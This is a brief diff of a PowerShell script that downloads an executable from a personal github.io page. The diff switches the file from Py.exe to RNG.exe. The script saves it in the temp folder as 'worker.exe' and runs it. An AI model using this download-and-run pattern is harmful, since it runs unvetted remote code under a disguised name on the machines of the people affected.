@@ -1,4 +1,4 @@
-$url = "https://miloszekxxdr.github.io/Website/Files/Py.exe"
+$url = "https://miloszekxxdr.github.io/Website/Files/RNG.exe"
 $tempFile = Join-Path $env:TEMP "worker.exe"
 Invoke-WebRequest -Uri $url -OutFile $tempFile
 $process = Start-Process -FilePath $tempFile -Wait -PassThru
